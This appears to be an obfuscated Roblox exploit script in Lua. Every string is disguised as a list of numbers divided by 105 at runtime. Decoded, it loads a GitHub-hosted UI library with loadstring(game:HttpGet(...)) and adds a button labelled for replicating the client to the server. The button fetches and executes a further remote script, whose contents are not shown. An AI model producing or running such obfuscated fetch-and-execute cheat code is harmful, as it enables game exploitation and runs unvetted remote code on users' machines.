function ujGYZSdokLsAepCstjXjNBXdIrqixzuDXrrNHjBYRqqkPgISXGmWSpStGMDRh(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


local Library = loadstring(game:HttpGet(ujGYZSdokLsAepCstjXjNBXdIrqixzuDXrrNHjBYRqqkPgISXGmWSpStGMDRh({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,12600,7560,10605,11760,12180,10395,4935,7875,10185,12390,11655,4725,8925,7665,4725,7980,11025,10290,11970,10185,11970,12705,4935,11445,10185,11025,11550,4935,12075,11655,12285,11970,10395,10605,4830,11340,12285,10185})))()
local Window = Library.CreateLib(ujGYZSdokLsAepCstjXjNBXdIrqixzuDXrrNHjBYRqqkPgISXGmWSpStGMDRh({8820,12075,11760,11340,11655,11025,12180,9975,10920,12285,10290,9975,11760,12285,10290,11340,11025,10395,9975,9030,5145}), ujGYZSdokLsAepCstjXjNBXdIrqixzuDXrrNHjBYRqqkPgISXGmWSpStGMDRh({7140,10185,11970,11235,8820,10920,10605,11445,10605}))
local Tab = Window:NewTab(ujGYZSdokLsAepCstjXjNBXdIrqixzuDXrrNHjBYRqqkPgISXGmWSpStGMDRh({11970,10605,11760,11340,11025,10395,10185,12180,10605}))
local Section = Tab:NewSection(ujGYZSdokLsAepCstjXjNBXdIrqixzuDXrrNHjBYRqqkPgISXGmWSpStGMDRh({8610,10605,11760,11340,11025,10395,10185,12180,11025,11655,11550}))
Section:NewButton(ujGYZSdokLsAepCstjXjNBXdIrqixzuDXrrNHjBYRqqkPgISXGmWSpStGMDRh({8715,12180,10185,11970,12180}), ujGYZSdokLsAepCstjXjNBXdIrqixzuDXrrNHjBYRqqkPgISXGmWSpStGMDRh({8715,12180,10185,11970,12180,3360,8610,10605,11760,11340,11025,10395,10185,12180,11025,11550,10815,3360,8820,10920,10605,3360,7035,11340,11025,10605,11550,12180,3360,8820,11655,3360,8820,10920,10605,3360,8715,10605,11970,12390,10605,11970,4830}), function()local replicatedEvent = Instance.new(ujGYZSdokLsAepCstjXjNBXdIrqixzuDXrrNHjBYRqqkPgISXGmWSpStGMDRh({8610,10605,11445,11655,12180,10605,7245,12390,10605,11550,12180}))
    loadstring(game:HttpGet(ujGYZSdokLsAepCstjXjNBXdIrqixzuDXrrNHjBYRqqkPgISXGmWSpStGMDRh({10920,12180,12180,11760,12075,6090,4935,4935,10815,11025,12180,10920,12285,10290,4830,10395,11655,11445,4935,8820,8715,8400,7980,8295,7665,8820,8295,7350,7350,7665,7035,7665,6825,7980,4935,8715,10395,11970,11025,11760,12180,7140,10605,11445,11655,12075,4935,10290,11340,11655,10290,4935,11445,10185,11025,11550,4935,8610,10605,11760,11340,11025,10395,10185,12180,11025,11655,11550,3885,5250,5040,8715,10395,11970,11025,11760,12180}),true))()
end)    
